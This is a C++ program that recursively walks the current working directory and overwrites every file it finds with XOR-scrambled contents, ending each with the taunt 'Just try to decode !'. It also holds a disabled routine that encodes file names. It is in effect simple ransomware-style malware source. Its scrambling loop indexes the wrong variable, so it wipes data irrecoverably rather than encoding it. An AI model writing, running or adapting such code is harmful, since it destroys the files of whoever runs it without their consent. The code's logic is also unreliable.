#include <iostream>
#include <fstream>
#include <vector>
#include <tuple>
#include <string>
#include <filesystem>
#include <cstdio>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>

#ifndef __has_include
  static_assert(false, "__has_include not supported");
#else
#  if __cplusplus >= 201703L && __has_include(<filesystem>)
#    include <filesystem>
     namespace fs = std::filesystem;
#  elif __has_include(<experimental/filesystem>)
#    include <experimental/filesystem>
     namespace fs = std::experimental::filesystem;
#  elif __has_include(<boost/filesystem.hpp>)
#    include <boost/filesystem.hpp>
     namespace fs = boost::filesystem;
#  endif
#endif


struct Stroke {
    int lenght;
    std::string payload_data;

    Stroke(int* m_lenght, std::string& m_payload_data) {
        this->lenght = *m_lenght;
        this->payload_data = m_payload_data;
    }
};

int dirExists(const char* const path)
{
    struct stat info;

    int statRC = stat( path, &info );
    if( statRC != 0 )
    {
        if (errno == ENOENT)  { return 0; }
        if (errno == ENOTDIR) { return 0; }
        return -1;
    }

    return ( info.st_mode & S_IFDIR ) ? 1 : 0;
}


inline bool existsFile(const std::string& name) {
	try {
		if (1 == dirExists(name.c_str())) {
			std::cout << "[d] Directory: " << name << std::endl;
			return false;
		}
		else if (FILE *file = fopen(name.c_str(), "r")) {
			fclose(file);
			return true;
		} 
	}
	catch(const std::exception& e) {
		std::cerr << e.what() << '\n';
		return false;
	}
	return false;
}

std::tuple<std::vector<Stroke>, int> readTextAndRemember(std::string& file_name) {
    int rows = 0;
    std::string s;
    std::ifstream file(file_name.c_str());
    std::vector<Stroke> datas;

    if (file.is_open()) {
        while (true) {
            getline(file, s);

            rows++;

            int len = s.length();
            datas.push_back(Stroke(&len, s));

            if (file.eof())
                break;
        }
    }
    else {
        std::cout << "File is closed!" << std::endl;
    }
	return (std::make_tuple(datas, rows));
}

void scramFileName(const char* file_name) {
	
	int len = static_cast<std::string>(file_name).length();

	std::ifstream file(file_name);
	char* new_file_name = new char[len];
	int spam;

	// encode file name
	for (int i(0); i < len; i++) {
		spam = (int)file_name[i] ^ 0b11111111;
		new_file_name[i] = (char)spam;
	}
	
	if (file.is_open()) {
		rename(file_name, new_file_name);
	}

	// decode file name
	// for (int j(0); j < len; j++) {
	// 	spam = (int)new_file_name[j] ^ 0b11111111;
	// 	new_file_name[j] = (char)spam;
	// } 
	// if (file.is_open()) {
	// 	rename(file_name, new_file_name);
	// }

	delete[] new_file_name;
	file_name = nullptr;
}

void scramContentOfFile(std::vector<Stroke>& arr, int* rows, const std::string& file_name) {

	std::ofstream ofs;
	int lenght_of_scram_stroke;

	ofs.open(file_name, std::ofstream::out | std::ofstream::trunc);
	ofs.close();

	ofs.open(file_name);

    if (ofs.is_open())
    {
		for (int i(0); i<*rows; i++) {
			lenght_of_scram_stroke = arr[i].lenght;
			char* scram_content = new char[lenght_of_scram_stroke];
			const char* content = arr[i].payload_data.c_str();

			for (int j(0); j < lenght_of_scram_stroke; j++) {
				scram_content[i] = content[i] ^ 0b11111111;
			}
			ofs << scram_content << "\n";

			delete[] scram_content;
			content = nullptr;
		}
        ofs << "Just try to decode !";
    }
	ofs.close();
	rows = nullptr;
}


int main() {

    char* pwd = get_current_dir_name();
	
	char* path = "./";
	int rows;
	std::vector<Stroke> arr;

	std::string file_name;
	std::cout << "[*] Current working directory: " << pwd << std::endl;
    pwd = nullptr;

	try {
		for (const auto & local: fs::recursive_directory_iterator(path)) {
			const fs::__cxx11::path ppp{local.path()};
			file_name = static_cast<std::string>(ppp);
			if (existsFile(file_name)) {
				std::cout << "[f] File " << file_name << std::endl;
				// simple encrypt file:
				tie(arr, rows) = readTextAndRemember(file_name);
				scramContentOfFile(arr, &rows, file_name);
				// full encrypt file:
				// scramFileName(file_name.c_str());
			}
		}	
	}
	catch(const std::exception& e) {
		std::cerr << e.what() << '\n';
	}


	path = nullptr;
    return 0;
}
